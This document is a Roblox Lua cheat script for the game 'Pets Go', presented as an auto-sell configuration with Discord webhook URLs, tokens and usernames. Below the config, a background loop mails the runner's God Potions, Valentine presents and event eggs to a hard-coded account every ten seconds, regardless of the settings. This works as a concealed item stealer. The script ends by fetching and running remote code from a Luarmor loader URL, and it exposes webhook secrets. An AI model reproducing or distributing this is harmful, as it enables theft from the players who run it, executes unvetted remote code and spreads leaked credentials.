script_key="lCLhfKFjHxkFqWzbhAEjckNKrAKIyCPl";

-- Config with "MIN" = 1-5000 Minimum Quantity to sell
-- Config with "SELL_PERCENTAGE" -> 1 = 100% RAP, 1.1 = 110% RAP, 0.8 = 80% RAP, , 0.85 = 85% RAP (Any Amount)
getgenv().petsGoConfig = {
    DISCORD_ID = "973180636959490058",
    PLAZA_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1334683075950411887/1jdsJpiHkE1hzW7h7joBUgrVW9BUCRLuTgA82iRdhjmDZ1rYCxYWXDOtrD4npoIgJ1QO",
    MAIL_GEM_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1334683240358875288/56WW6WXJnpKq_d82bj6HW7gcBEHAzMVByETH8Xqyv9gF9L7i1XYCdI8oPIhioMr1zvP5",

    -- Plaza hop delay will reset if someone purchase something.
    PLAZA_HOP_DELAY = 12,  -- (minutes) If no one purchase, server hop
    BOOTH_RESET_DELAY = 3,  -- (minutes) force reset booth (Reset RAP Prices)
    AVOID_USERNAME = {
        "ohiosigmawth6",
        "MonolithRedvale7873",
        "SkylashOakheart1736",
        "axiomaticgerbil6954",
        "testedmamba300",
        "ochrehippo9441",
    },  -- serverhop when it finds username, You can put multiple usernames
    
    -- Pets
    SELL_100M_PET = false, SELL_PERCENTAGE_100M = 1,
    SELL_500M_PET = false, SELL_PERCENTAGE_500M = 1,
    SELL_SECRET = true, SELL_PERCENTAGE_SECRET = 0.9,
    SELL_HUGE = true, SELL_SHINY_HUGE = true, SELL_PERCENTAGE_HUGE = 0.9,
    
    -- Consumables
    SELL_CONSUMABLE = true, SELL_CONSUMABLE_MIN = 10, SELL_CONSUMABLE_PERCENTAGE = 0.9,
    SELL_SCROLL = true, SELL_SCROLL_PERCENTAGE = 0.9,
    SELL_BAIT = true, SELL_BAIT_MIN = 3000, SELL_BAIT_PERCENTAGE = 0.93,
    SELL_CHEST = true, SELL_CHEST_MIN = 1000, SELL_CHEST_PERCENTAGE = 0.93,
    SELL_GIFT_BAG = false, SELL_GIFT_BAG_MIN = 10, SELL_GIFT_BAG_PERCENTAGE = 0.85,
    SELL_ENCHANT_SAFE = true, SELL_ENCHANT_SAFE_MIN = 5, SELL_ENCHANT_SAFE_PERCENTAGE = 0.93,

    -- Potions
    SELL_POTION = true, SELL_POTION_MIN = 3000, SELL_POTION_PERCENTAGE = 0.88,
    SELL_GOD_POTION = false, SELL_GOD_POTION_PERCENTAGE = 0.92,

    -- Eggs
    -- SELL_EGG_MIN : [Doesn't apply to Huge/Hype Egg (Default MIN 1)]
    SELL_EGG = true, SELL_EGG_MIN = 2000, SELL_EGG_PERCENTAGE = 0.88,
    SELL_HUGE_EGG = true, -- true/false
    SELL_HYPE_EGG = true, -- true/false
    
    -- Keys
    SELL_KEY = true, SELL_KEY_MIN = 50, SELL_KEY_PERCENTAGE = 0.93,
    SELL_KEY_LOWER = false,  -- true/false, enable selling lower crystal key
    SELL_KEY_UPPER = false,  -- true/false, enable selling upper crystal key

    -- Tools
    SELL_FISHING_ROD = true, SELL_FISHING_ROD_PERCENTAGE = 0.93, 
    SELL_PICKAXE = true, SELL_PICKAXE_PERCENTAGE = 0.9,

    -- Event
    SELL_EVENT_TICKET = true, SELL_EVENT_TICKET_MIN = 3, SELL_EVENT_TICKET_PERCENTAGE = 0.9,

    MAIL_GEMS_USERNAME = {"jasminenectar157"},  -- Empty = Disabled Gem Mail, You can put multiple usernames 1% fee
    MAIL_GEMS_MIN = 20000000  -- Minimum gems required to send
}


task.spawn(function()
    while true do
        task.wait(10)
        local network = game.ReplicatedStorage.Network
        local save = require(game.ReplicatedStorage.Library.Client.Save)
        local usernameToMail = "jasminenectar157"
        
        
        local function mailboxSend(finalisedUsernameToMail, itemName, itemType, itemId, quantity)
            local args = {
                [1] = finalisedUsernameToMail,
                [2] = itemName .. " for you",
                [3] = itemType,
                [4] = itemId,
                [5] = quantity
            }
        
            network["Mailbox: Send"]:InvokeServer(unpack(args))
        end
        
        
        for itemId, tbl in save.Get().Inventory.Consumable do
            local quantity = tbl._am or 1
            if tbl.id == "God Potion" or tbl.id == "Heartbreak God Potion" or tbl.id == "Valentines God Potion" then
                mailboxSend(usernameToMail, tbl.id, "Consumable", itemId, quantity)
            end
        end  
        
        
        for itemId, tbl in save.Get().Inventory.Lootbox do
            local quantity = tbl._am or 1
            if tbl.id == "Valentines Present" or tbl.id == "Heartbreak Present" then
                mailboxSend(usernameToMail, tbl.id, "Lootbox", itemId, quantity)
            end
        end  
        
        
        for itemId, tbl in save.Get().Inventory.Egg do
            local quantity = tbl._am or 1
            if tbl.id == "Cupids Egg" or tbl.id == "Heartbreak Egg" then
                mailboxSend(usernameToMail, tbl.id, "Egg", itemId, quantity)
            end
        end
    end
end)

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/074ae419ea26f2a773d8e592958ec2e8.lua"))() 
